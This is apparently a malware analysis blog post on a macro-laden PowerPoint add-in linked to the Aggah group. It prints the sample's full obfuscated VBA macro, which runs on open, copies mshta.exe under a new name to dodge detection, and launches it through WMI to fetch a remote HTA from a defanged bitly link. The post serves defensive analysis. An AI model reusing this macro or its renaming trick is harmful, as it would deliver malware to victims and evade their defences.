---
layout: post
title: "Aggah PPAM macros renaming MSHTA"
date: 2022-03-04
categories: malware ppam macro mshta aggah 
permalink: /aggah-ppam-renamed-mshta/
---

In this quick post I'm taking a look at a PowerPoint file with macros on board! According to MalwareBazaar's tags, it was reported in association with the group "Aggah". If you want to follow along at home, the sample is here in MalwareBazaar: [https://bazaar.abuse.ch/sample/6b4970c6016fbff8665932c69d95203863c7ea46ae0f86e02525a4694f60f115/](https://bazaar.abuse.ch/sample/6b4970c6016fbff8665932c69d95203863c7ea46ae0f86e02525a4694f60f115/).

## Triaging the file

As usual, let's make sure we have a valid PPAM file. We can do this a few ways, I'll settle for `file` and `diec` here.

```console
remnux@remnux:~/cases/aggah$ file rfq.ppam 
rfq.ppam: Microsoft PowerPoint 2007+

remnux@remnux:~/cases/aggah$ diec rfq.ppam 
Binary
    Archive: Zip(2.0)[34.9%,36 files]
    Data: ZIP archive
```

The `diec` output might throw some folks off, but it's expected in this case. Office 2007+ documents are a collection of XML files stashed in a structured zip archive.

## Counting macros

To get the macro code, we can employ `olevba`.

```console
remnux@remnux:~/cases/aggah$ olevba rfq.ppam 
olevba 0.60 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: rfq.ppam
Type: OpenXML
WARNING  For now, VBA stomping cannot be detected for files in memory
-------------------------------------------------------------------------------
VBA MACRO Module1.bas 
in file: ppt/ueryeur.n - OLE stream: 'VBA/Module1'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Sub Auto_Open()
MsgBox "error! Re-install office"
Set kaosk = GetObject("new:0D43FE01-F093-11CF-8940-00A0C9054228")
kaosk.copyfile "C:\Windows\System32\mshta.exe", "C:\\ProgramData\\cond.com", True
kokokasd = "C:mmmmmmmmDLASDLlrogramDatammmmmmmmcond0lol hmotamotaDLASDLls:sexsexmislalmislalmislal0bimotaly0lolsex" + "itjjjskrr"
kokokasd = Replace(kokokasd, "DLASDLl", "p")
kokokasd = Replace(kokokasd, "mislal", "w")
kokokasd = Replace(kokokasd, "mota", "t")
kokokasd = Replace(kokokasd, "0", ".")
kokokasd = Replace(kokokasd, "jdaudwoks", "e")
kokokasd = Replace(kokokasd, "lol", "com")
kokokasd = Replace(kokokasd, "sex", "/")
kokokasd = Replace(kokokasd, "mmmm", "\")
adjaiwdjiaskd = "01n2g2tkokokasd:"
adjaiwdjiaskd = Replace(adjaiwdjiaskd, "0", "W")
adjaiwdjiaskd = Replace(adjaiwdjiaskd, "1", "i")
adjaiwdjiaskd = Replace(adjaiwdjiaskd, "2", "m")
adjaiwdjiaskd = Replace(adjaiwdjiaskd, "kokokasd", "s")
aksdokasodkoaksd = "aksdokasodkoaksd5nooo_Proce66"
aksdokasodkoaksd = Replace(aksdokasodkoaksd, "aksdokasodkoaksd", "W")
aksdokasodkoaksd = Replace(aksdokasodkoaksd, "5", "i")
aksdokasodkoaksd = Replace(aksdokasodkoaksd, "ooo", "32")
aksdokasodkoaksd = Replace(aksdokasodkoaksd, "6", "s")
GetObject(adjaiwdjiaskd). _
Get(aksdokasodkoaksd). _
Create _
kokokasd, _
Null, _
Null, _
pid
End Sub

+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |Auto_Open           |Runs when the Excel Workbook is opened       |
|Suspicious|copyfile            |May copy a file                              |
|Suspicious|Create              |May execute file or a system command through |
|          |                    |WMI                                          |
|Suspicious|GetObject           |May get an OLE object with a running instance|
|Suspicious|Windows             |May enumerate application windows (if        |
|          |                    |combined with Shell.Application object)      |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|IOC       |mshta.exe           |Executable file name                         |
+----------+--------------------+---------------------------------------------+
```

There are a few interesting things in the code that stand out. First, a macro runs when PPAM opens because the macro defines a `Auto_Open()` function. Next, the macro copies mshta.exe to `C:\ProgramData\cond.com`. This is a simple and lazy way to evade detection rules that are brittle. Detection rules just checking for `mshta.exe` by name without additional binary property checks will get thrown off by this technique. Next, there looks like a ton of string obfuscation via replacement operations. We can simplify down the obfuscation showing these strings:

```text
kokokasd = "C:\\programData\\cond.com hxxps://www.bitly[.]com/itjjjskrr"
adjaiwdjiaskd = "Winmgmts:"
aksdokasodkoaksd = "Win32_Process"
```

Given these strings we can assume one of the next steps will spawn `cond.com`, the renamed mshta, to visit a bitly link and process malicious content in a HTA file. Judging from the string `Win32_Process`, the name of the WMI Process class, we can assume the `cond.com` process will execute via WMI, making it spawn from `wmiprvse.exe`. From here the trail dried up for me here because it didn't look like the sandboxes got a copy of the HTA. It likely didn't successfully execute or download.

Thanks for reading!